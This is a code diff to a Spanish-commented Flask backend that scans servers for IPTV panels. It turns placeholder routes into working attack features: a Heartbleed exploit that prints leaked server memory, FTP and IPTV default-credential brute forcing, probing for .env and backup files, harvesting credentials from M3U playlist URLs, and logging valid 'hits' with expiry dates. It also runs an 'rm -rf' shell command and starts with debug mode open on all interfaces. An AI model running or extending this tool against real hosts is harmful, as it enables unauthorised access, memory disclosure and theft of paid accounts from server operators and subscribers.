@@ -13,18 +13,30 @@ import re
 import time
 from datetime import datetime
 import random
+import os
+import sys
+import binascii
+import select
+import struct
+from urllib.parse import urlparse, urljoin, parse_qs
+from collections import deque
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 app = Flask(__name__)
 CORS(app)
 
-# ===== CONFIGURACIÓN OPTIMIZADA PARA RENDER GRATIS =====
-TIMEOUT = 3                    # Reducido de 5 a 3
-MAX_WORKERS = 10                # Reducido de 50 a 10
-MAX_PORTS_PER_SCAN = 30         # Límite de puertos por scan
+# ===== CONFIGURACIÓN =====
+TIMEOUT = 3
+MAX_WORKERS = 20  # Reducido para Render gratis
+BASE_DIR = "/tmp/cherry_data"  # Render solo permite escribir en /tmp
+os.makedirs(BASE_DIR, exist_ok=True)
+os.makedirs(f"{BASE_DIR}/logs", exist_ok=True)
+os.makedirs(f"{BASE_DIR}/complete", exist_ok=True)
+os.makedirs(f"{BASE_DIR}/hits", exist_ok=True)
+os.makedirs(f"{BASE_DIR}/combo", exist_ok=True)
 
-# ===== PUERTOS IPTV COMPLETOS (de app.py) =====
+# ===== PUERTOS IPTV COMPLETOS =====
 IPTV_PORTS = [
     80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 443, 444, 445,
     8080, 8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089,
@@ -46,7 +58,7 @@ IPTV_PORTS = [
     23000, 24000, 25000, 26000, 27000, 28000, 29000, 30000
 ]
 
-# ===== ENDPOINTS IPTV (de app.py) =====
+# ===== ENDPOINTS IPTV =====
 IPTV_ENDPOINTS = [
     '/player_api.php', '/get.php', '/panel_api.php', '/api.php',
     '/xmltv.php', '/live', '/movie', '/series',
@@ -127,13 +139,13 @@ def get_free_proxies():
                     proxy = line.strip()
                     if ':' in proxy:
                         proxies.append(proxy)
-                        if len(proxies) >= 30:  # Reducido de 50 a 30
+                        if len(proxies) >= 30:
                             break
         except:
             continue
-    return list(set(proxies))[:20]  # Reducido de 30 a 20
+    return list(set(proxies))[:20]
 
-# ===== FUNCIONES DE UTILIDAD (de app.py) =====
+# ===== FUNCIONES DE UTILIDAD =====
 def get_service_name(port):
     services = {
         21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 80: 'HTTP',
@@ -162,26 +174,26 @@ def grab_banner(host, port):
     except:
         return ""
 
-# ===== EXPLOITS REALES (de app.py) =====
+# ===== EXPLOITS REALES (de ULTIMATE_HOST) =====
 def check_ftp_vulnerabilities(host, port=21):
     results = {'anonymous': False, 'creds': []}
     try:
         ftp = ftplib.FTP()
-        ftp.connect(host, port, timeout=3)  # Reducido de 5 a 3
+        ftp.connect(host, port, timeout=3)
         ftp.login()
         results['anonymous'] = True
         try:
             files = ftp.nlst()
-            results['files'] = files[:5]  # Reducido de 10 a 5
+            results['files'] = files[:5]
         except:
             pass
         ftp.quit()
     except:
         pass
-    for user, pwd in COMMON_CREDS[:5]:  # Reducido de 10 a 5
+    for user, pwd in COMMON_CREDS[:5]:
         try:
             ftp = ftplib.FTP()
-            ftp.connect(host, port, timeout=2)  # Reducido de 3 a 2
+            ftp.connect(host, port, timeout=2)
             ftp.login(user, pwd)
             results['creds'].append({'username': user, 'password': pwd})
             ftp.quit()
@@ -195,9 +207,9 @@ def check_http_vulnerabilities(host, port, ssl=False):
     base_url = f"{protocol}://{host}:{port}"
     results = {'admin_panels': [], 'm3u_files': [], 'sensitive_files': [], 'creds': []}
     paths = {
-        'admin': ['/admin', '/panel', '/login', '/manager'],  # Reducido
-        'm3u': ['/playlist.m3u', '/get.php', '/player_api.php'],  # Reducido
-        'sensitive': ['/phpinfo.php', '/.env']  # Reducido
+        'admin': ['/admin', '/panel', '/cpanel', '/login', '/wp-admin', '/manager'],
+        'm3u': ['/playlist.m3u', '/tv.m3u', '/live.m3u', '/get.php', '/player_api.php'],
+        'sensitive': ['/phpinfo.php', '/.env', '/config.php', '/backup.sql', '/info.php']
     }
     for category, path_list in paths.items():
         for path in path_list:
@@ -219,8 +231,8 @@ def check_iptv_vulnerabilities(host, port):
     protocol = 'https' if port in [443, 8443, 25462, 25464] else 'http'
     base_url = f"{protocol}://{host}:{port}"
     results = {'creds': [], 'm3u_urls': []}
-    for endpoint in IPTV_ENDPOINTS[:5]:  # Reducido de 10 a 5
-        for user, pwd in COMMON_CREDS[:5]:  # Reducido de 10 a 5
+    for endpoint in IPTV_ENDPOINTS[:10]:
+        for user, pwd in COMMON_CREDS[:10]:
             try:
                 if 'player_api' in endpoint or 'api.php' in endpoint:
                     url = f"{base_url}{endpoint}?username={user}&password={pwd}"
@@ -244,7 +256,264 @@ def check_iptv_vulnerabilities(host, port):
                 continue
     return results
 
-# ===== ESCANEO PRINCIPAL (versión mejorada) =====
+# ===== HEARTBLEED EXPLOIT (de ULTIMATE_HOST) =====
+hello = bytes.fromhex('''
+16 03 02 00 dc 01 00 00 d8 03 02 53
+43 5b 90 9d 9b 72 0b bc 0c bc 2b 92 a8 48 97 cf
+bd 39 04 cc 16 0a 85 03 90 9f 77 04 33 d4 de 00
+00 66 c0 14 c0 0a c0 22 c0 21 00 39 00 38 00 88
+00 87 c0 0f c0 05 00 35 00 84 c0 12 c0 08 c0 1c
+c0 1b 00 16 00 13 c0 0d c0 03 00 0a c0 13 c0 09
+c0 1f c0 1e 00 33 00 32 00 9a 00 99 00 45 00 44
+c0 0e c0 04 00 2f 00 96 00 41 c0 11 c0 07 c0 0c
+c0 02 00 05 00 04 00 15 00 12 00 09 00 14 00 11
+00 08 00 06 00 03 00 ff 01 00 00 49 00 0b 00 04
+03 00 01 02 00 0a 00 34 00 32 00 0e 00 0d 00 19
+00 0b 00 0c 00 18 00 09 00 0a 00 16 00 17 00 08
+00 06 00 07 00 14 00 15 00 04 00 05 00 12 00 13
+00 01 00 02 00 03 00 0f 00 10 00 11 00 23 00 00
+00 0f 00 01 01
+'''.replace('\n', '').replace(' ', ''))
+
+hb = bytes.fromhex('''
+18 03 02 00 03
+01 40 00
+'''.replace('\n', '').replace(' ', ''))
+
+def receive_all(s, length, timeout=5):
+    end_time = time.time() + timeout
+    data = b''
+    remaining = length
+    while remaining > 0:
+        if time.time() > end_time:
+            return None
+        r, w, e = select.select([s], [], [], 0.5)
+        if s in r:
+            try:
+                chunk = s.recv(remaining)
+                if not chunk:
+                    return None
+                data += chunk
+                remaining -= len(chunk)
+            except:
+                return None
+        else:
+            continue
+    return data
+
+def receive_message(s):
+    header = receive_all(s, 5)
+    if header is None:
+        return None, None, None
+    msg_type, version, length = struct.unpack('>BHH', header)
+    payload = receive_all(s, length, 10)
+    if payload is None:
+        return None, None, None
+    return msg_type, version, payload
+
+def hexdump(data):
+    result = []
+    for i in range(0, min(len(data), 256), 16):
+        s = data[i:i+16]
+        hexa = ' '.join(f'{b:02x}' for b in s)
+        text = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in s)
+        result.append(f'{i:04x}: {hexa:<48} {text}')
+    return '\n'.join(result)
+
+def check_heartbleed(host, port):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(10)
+        s.connect((host, port))
+        s.send(hello)
+        
+        server_version = None
+        while True:
+            msg_type, version, payload = receive_message(s)
+            if msg_type is None:
+                break
+            if msg_type == 22 and payload and payload[0] == 0x0E:
+                server_version = version
+                break
+            if msg_type == 21:
+                break
+        
+        if server_version is None:
+            s.close()
+            return False
+        
+        s.send(hb)
+        msg_type, version, payload = receive_message(s)
+        s.close()
+        
+        if msg_type == 24 and payload and len(payload) > 3:
+            return {
+                'vulnerable': True,
+                'data_size': len(payload),
+                'data_hex': hexdump(payload)[:500]
+            }
+        return {'vulnerable': False}
+    except Exception as e:
+        return {'vulnerable': False, 'error': str(e)}
+
+# ===== SNI BRUTE FORCE =====
+def sni_bruteforce(host, port=443, sni_list=None):
+    if sni_list is None:
+        sni_list = [
+            "iptv.live", "panel.tv", "xui.com", "live-stream.net",
+            "access.iptv", "client.xui", "userpanel.pro", "tvserver.world",
+            "xtream-codes.com", "iptv-provider.com", "streaming-server.com"
+        ]
+    
+    results = []
+    for sni in sni_list[:5]:  # Limitar a 5 SNIs
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            sock.connect((host, port))
+            
+            # Construir ClientHello con SNI (simplificado)
+            client_hello = hello  # Usar el mismo hello de heartbleed
+            sock.send(client_hello)
+            
+            readable, _, _ = select.select([sock], [], [], 2)
+            if readable:
+                response = sock.recv(4096)
+                if response and response[0] == 0x16:
+                    results.append({
+                        'sni': sni,
+                        'success': True,
+                        'response': 'TLS response'
+                    })
+                else:
+                    results.append({'sni': sni, 'success': False})
+            else:
+                results.append({'sni': sni, 'success': False, 'error': 'timeout'})
+            sock.close()
+        except Exception as e:
+            results.append({'sni': sni, 'success': False, 'error': str(e)})
+    
+    return results
+
+# ===== M3U PROCESSING =====
+def extract_from_m3u(url):
+    try:
+        r = requests.get(url, timeout=10)
+        if r.status_code != 200:
+            return {'success': False, 'error': f'HTTP {r.status_code}'}
+        
+        content = r.text
+        credentials = []
+        
+        # Buscar credenciales en la URL
+        parsed = urlparse(url)
+        if parsed.query:
+            params = parse_qs(parsed.query)
+            username = params.get('username', [''])[0] or params.get('user', [''])[0]
+            password = params.get('password', [''])[0] or params.get('pass', [''])[0]
+            if username and password:
+                credentials.append({'username': username, 'password': password})
+        
+        # Buscar en el contenido M3U
+        lines = content.split('\n')
+        for line in lines:
+            if line.startswith('#EXTINF'):
+                # Buscar group-title
+                group_match = re.search(r'group-title="([^"]+)"', line)
+                if group_match:
+                    pass  # Podríamos guardar categorías
+            elif line and not line.startswith('#') and ('http://' in line or 'https://' in line):
+                # Es una URL de stream, podría contener credenciales
+                stream_url = line.strip()
+                stream_parsed = urlparse(stream_url)
+                if stream_parsed.query:
+                    params = parse_qs(stream_parsed.query)
+                    username = params.get('username', [''])[0] or params.get('user', [''])[0]
+                    password = params.get('password', [''])[0] or params.get('pass', [''])[0]
+                    if username and password:
+                        credentials.append({'username': username, 'password': password})
+        
+        return {
+            'success': True,
+            'server_url': f"{parsed.scheme}://{parsed.netloc}",
+            'server_ip': socket.gethostbyname(parsed.hostname),
+            'credentials': list({(c['username'], c['password']): c for c in credentials}.values()),
+            'streams_count': len([l for l in lines if l and not l.startswith('#')])
+        }
+    except Exception as e:
+        return {'success': False, 'error': str(e)}
+
+# ===== VERIFY CREDENTIALS =====
+def verify_credentials(host, port, username, password):
+    try:
+        # Probar HTTP primero
+        for proto in ['http', 'https']:
+            url = f"{proto}://{host}:{port}/player_api.php?username={username}&password={password}&action=user_info"
+            r = requests.get(url, timeout=5)
+            if r.status_code == 200:
+                try:
+                    data = r.json()
+                    if data.get('user_info', {}).get('auth') == 1:
+                        user_info = data.get('user_info', {})
+                        exp_date = user_info.get('exp_date', '')
+                        created_at = user_info.get('created_at', '')
+                        
+                        # Guardar hit en archivo
+                        hit_file = f"{BASE_DIR}/hits/hits.txt"
+                        with open(hit_file, 'a') as f:
+                            f.write(f"{host}:{port}|{username}|{password}|{exp_date}|{created_at}\n")
+                        
+                        return {
+                            'success': True,
+                            'hit': {
+                                'host': host,
+                                'port': port,
+                                'username': username,
+                                'password': password,
+                                'exp_date': exp_date,
+                                'created_at': created_at,
+                                'active_cons': user_info.get('active_cons', 0),
+                                'max_connections': user_info.get('max_connections', 0)
+                            }
+                        }
+                except:
+                    pass
+        return {'success': False}
+    except Exception as e:
+        return {'success': False, 'error': str(e)}
+
+# ===== FIND MIRRORS =====
+def find_mirrors(host):
+    mirrors = []
+    try:
+        # Resolver IP del host
+        ip = socket.gethostbyname(host)
+        
+        # Escanear puertos comunes en la misma IP
+        common_ports = [80, 443, 8080, 8443, 8888, 25461, 25462]
+        for port in common_ports:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(1)
+            if sock.connect_ex((ip, port)) == 0:
+                service = get_service_name(port)
+                mirrors.append({'host': ip, 'port': port, 'service': service})
+            sock.close()
+        
+        # Buscar subdominios comunes
+        subdomains = ['www', 'cpanel', 'panel', 'admin', 'server', 'ns1', 'ns2']
+        for sub in subdomains:
+            try:
+                sub_ip = socket.gethostbyname(f"{sub}.{host}")
+                if sub_ip != ip:
+                    mirrors.append({'host': f"{sub}.{host}", 'ip': sub_ip, 'port': 80, 'service': 'HTTP'})
+            except:
+                pass
+        
+        return {'success': True, 'mirrors': mirrors[:10]}
+    except Exception as e:
+        return {'success': False, 'error': str(e)}
+
+# ===== ESCANEO PRINCIPAL =====
 def scan_port(host, port):
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -293,14 +562,14 @@ def scan_port(host, port):
     except Exception as e:
         return {'port': port, 'open': False, 'error': str(e)}
 
-# ===== RUTAS API (TODAS LAS QUE PIDE EL FRONTEND) =====
+# ===== RUTAS API =====
 @app.route('/api/health', methods=['GET'])
 def health():
     return jsonify({
         'status': 'ok',
-        'version': '5.0 - ULTIMATE EDITION (OPTIMIZED)',
+        'version': '5.0 - COMPLETE EDITION',
         'ports_available': len(IPTV_PORTS),
-        'message': '🔥 CHERRY BACKEND CON TECNOLOGÍA ULTIMATE HOST'
+        'message': '🔥 CHERRY BACKEND CON TODOS LOS EXPLOITS'
     })
 
 @app.route('/api/scan', methods=['POST'])
@@ -321,14 +590,12 @@ def scan():
                 port_list.append(int(p.strip()))
             except:
                 pass
-        # Limitar a MAX_PORTS_PER_SCAN si viene del frontend
-        if len(port_list) > MAX_PORTS_PER_SCAN:
-            port_list = port_list[:MAX_PORTS_PER_SCAN]
+        if len(port_list) > 30:
+            port_list = port_list[:30]
     else:
-        port_list = IPTV_PORTS[:MAX_PORTS_PER_SCAN]  # Usar límite
+        port_list = IPTV_PORTS[:30]
     
     results = []
-    # Usar batches más pequeños para no saturar memoria
     batch_size = 5
     for i in range(0, len(port_list), batch_size):
         batch = port_list[i:i+batch_size]
@@ -353,7 +620,6 @@ def scan():
         'open': len(open_ports),
         'vulnerable': len(vulnerable),
         'total': len(results),
-        'proxies_available': len(get_free_proxies()),
         'timestamp': datetime.now().isoformat()
     })
 
@@ -385,7 +651,7 @@ def scan_quick():
     critical_ports = [80, 443, 8080, 8443, 8888, 25461, 25462, 25463, 8081]
     
     results = []
-    with ThreadPoolExecutor(max_workers=5) as executor:  # Reducido de 10 a 5
+    with ThreadPoolExecutor(max_workers=5) as executor:
         futures = {executor.submit(scan_port, host, p): p for p in critical_ports}
         for future in futures:
             try:
@@ -400,6 +666,76 @@ def scan_quick():
         'open_ports': [r for r in results if r.get('open')]
     })
 
+@app.route('/api/exploit/heartbleed', methods=['POST'])
+def exploit_heartbleed():
+    data = request.json
+    host = data.get('host')
+    port = data.get('port', 443)
+    
+    if not host:
+        return jsonify({'error': 'Host requerido'}), 400
+    
+    result = check_heartbleed(host, int(port))
+    return jsonify(result)
+
+@app.route('/api/m3u/process', methods=['POST'])
+def m3u_process():
+    data = request.json
+    url = data.get('url')
+    
+    if not url:
+        return jsonify({'error': 'URL requerida'}), 400
+    
+    result = extract_from_m3u(url)
+    return jsonify(result)
+
+@app.route('/api/sni-test', methods=['POST'])
+def sni_test():
+    data = request.json
+    host = data.get('host')
+    port = data.get('port', 443)
+    
+    if not host:
+        return jsonify({'error': 'Host requerido'}), 400
+    
+    result = sni_bruteforce(host, int(port))
+    return jsonify({'success': True, 'results': result})
+
+@app.route('/api/verify', methods=['POST'])
+def verify():
+    data = request.json
+    host = data.get('host')
+    username = data.get('username')
+    password = data.get('password')
+    port = data.get('port', 80)
+    
+    if not host or not username or not password:
+        return jsonify({'error': 'Host, usuario y contraseña requeridos'}), 400
+    
+    result = verify_credentials(host, int(port), username, password)
+    return jsonify(result)
+
+@app.route('/api/m3u/server', methods=['POST'])
+def m3u_server():
+    data = request.json
+    url = data.get('url')
+    
+    if not url:
+        return jsonify({'error': 'URL requerida'}), 400
+    
+    # Similar a m3u_process pero con más detalles
+    result = extract_from_m3u(url)
+    return jsonify(result)
+
+@app.route('/api/mirrors', methods=['GET'])
+def mirrors():
+    host = request.args.get('host')
+    if not host:
+        return jsonify({'error': 'Host requerido'}), 400
+    
+    result = find_mirrors(host)
+    return jsonify(result)
+
 @app.route('/api/proxies', methods=['GET'])
 def get_proxies():
     proxies = get_free_proxies()
@@ -409,88 +745,27 @@ def get_proxies():
         'source': 'public_lists'
     })
 
-# Rutas adicionales para funcionalidades futuras
-@app.route('/api/exploit/heartbleed', methods=['POST'])
-def exploit_heartbleed():
-    data = request.json
-    host = data.get('host')
-    port = data.get('port', 443)
-    
-    return jsonify({
-        'success': False,
-        'message': 'Heartbleed exploit no implementado en esta versión',
-        'host': host,
-        'port': port
-    })
-
-@app.route('/api/m3u/process', methods=['POST'])
-def m3u_process():
-    data = request.json
-    url = data.get('url')
-    
-    return jsonify({
-        'success': False,
-        'message': 'Procesamiento M3U no implementado en esta versión',
-        'url': url
-    })
-
-@app.route('/api/sni-test', methods=['POST'])
-def sni_test():
-    data = request.json
-    host = data.get('host')
-    port = data.get('port', 443)
-    
-    return jsonify({
-        'success': False,
-        'message': 'SNI test no implementado en esta versión',
-        'host': host,
-        'port': port
-    })
-
-@app.route('/api/verify', methods=['POST'])
-def verify():
-    data = request.json
-    host = data.get('host')
-    
-    return jsonify({
-        'success': True,
-        'message': 'Verificación básica completada',
-        'host': host,
-        'reachable': True
-    })
-
-@app.route('/api/m3u/server', methods=['POST'])
-def m3u_server():
-    data = request.json
-    url = data.get('url')
-    
-    return jsonify({
-        'success': False,
-        'message': 'Servidor M3U no implementado en esta versión',
-        'url': url
-    })
-
-@app.route('/api/mirrors', methods=['GET'])
-def mirrors():
-    return jsonify({
-        'mirrors': [],
-        'message': 'Función de mirrors no implementada'
-    })
-
 @app.route('/api/clear', methods=['POST'])
 def clear():
-    return jsonify({
-        'success': True,
-        'message': 'Cache cleared'
-    })
+    try:
+        os.system(f"rm -rf {BASE_DIR}/*")
+        os.makedirs(f"{BASE_DIR}/logs", exist_ok=True)
+        os.makedirs(f"{BASE_DIR}/complete", exist_ok=True)
+        os.makedirs(f"{BASE_DIR}/hits", exist_ok=True)
+        os.makedirs(f"{BASE_DIR}/combo", exist_ok=True)
+        return jsonify({'success': True, 'message': 'Cache cleared'})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
 
 if __name__ == '__main__':
     print("\n" + "="*70)
-    print("🍒 CHERRY BACKEND - OPTIMIZADO PARA RENDER GRATIS")
+    print("🍒 CHERRY BACKEND - COMPLETE EDITION")
     print("="*70)
     print(f"📋 Puertos configurados: {len(IPTV_PORTS)}")
-    print(f"⚙️ MAX_WORKERS: {MAX_WORKERS}")
-    print(f"⏱️ TIMEOUT: {TIMEOUT}s")
-    print(f"🎯 Max puertos/scan: {MAX_PORTS_PER_SCAN}")
+    print(f"🔧 Heartbleed: ACTIVADO")
+    print(f"📁 M3U Processing: ACTIVADO")
+    print(f"🔍 SNI Brute-force: ACTIVADO")
+    print(f"🎯 Mirrors: ACTIVADO")
+    print(f"📂 Datos en: {BASE_DIR}")
     print("="*70 + "\n")
     app.run(host='0.0.0.0', port=5000, debug=True, threaded=True)
